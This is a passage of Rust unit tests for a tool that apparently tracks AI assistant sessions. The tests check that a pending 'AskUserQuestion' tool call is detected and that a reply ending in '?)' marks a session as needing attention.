        assert_eq!(get_pending_tool_name(&entries), Some("Question".to_string()));
    }

    #[test]
    fn test_get_pending_tool_name_ask_user_question() {
        // Pending AskUserQuestion tool should return "AskUserQuestion"
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::ToolUse {
                    id: "toolu_123".to_string(),
                    name: "AskUserQuestion".to_string(),
                    input: serde_json::json!({"question": "Which approach?"}),
                }],
                stop_reason: Some("tool_use".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(
            get_pending_tool_name(&entries),
            Some("AskUserQuestion".to_string())
        );
    }

    #[test]
    fn test_question_with_parenthesis() {
        // Text ending with ?) should also be detected
        let entries = vec![SessionEntry::Assistant {
            base: create_old_base(),
            message: AssistantMessage {
                model: "claude-opus-4-5-20251101".to_string(),
                id: "msg_test".to_string(),
                role: "assistant".to_string(),
                content: vec![MessageContent::Text {
                    text: "This requires `bun` — do you have it installed?)".to_string(),
                }],
                stop_reason: Some("end_turn".to_string()),
                stop_sequence: None,
                usage: None,
            },
        }];
        assert_eq!(determine_status(&entries), SessionStatus::NeedsAttention);
    }
}
